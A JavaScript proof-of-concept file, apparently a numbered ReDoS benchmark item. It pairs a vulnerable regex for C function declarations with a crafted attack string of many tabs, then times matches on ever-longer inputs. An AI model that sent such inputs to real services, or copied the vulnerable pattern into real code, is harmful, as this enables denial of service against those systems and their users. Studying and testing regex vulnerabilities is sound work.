/* 1712
 * (\s)*(int|void|float|char|double|string)((\s)|(\*))*(\&?)(\s)+([a-z])([a-z0-9])*(\s)*(\()(\s)*((int|void|float|char|double|string)((\s)|(\*))*(\&?)(\s)+([a-z])([a-z0-9])*((\s)*[,](\s)*(int|void|float|char|double|string)((\s)|(\*))*(\&?)(\s)+([a-z])([a-z0-9])*)*)?(\s)*(\))(\s)*;
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"int"+"\t"*5000+"◎@! _1!_1!1 _!1 _!_1◎@! _1!_1! _1!_1◎@! _1!_1! _1!_1!\n_SLQ_3"
 */
var REGEX = /(\s)*(int|void|float|char|double|string)((\s)|(\*))*(\&?)(\s)+([a-z])([a-z0-9])*(\s)*(\()(\s)*((int|void|float|char|double|string)((\s)|(\*))*(\&?)(\s)+([a-z])([a-z0-9])*((\s)*[,](\s)*(int|void|float|char|double|string)((\s)|(\*))*(\&?)(\s)+([a-z])([a-z0-9])*)*)?(\s)*(\))(\s)*;/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'int' + '\t'.repeat(i*10000) + '◎@! _1!_1!1 _!1 _!_1◎@! _1!_1! _1!_1◎@! _1!_1! _1!_1!\n_SLQ_3'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}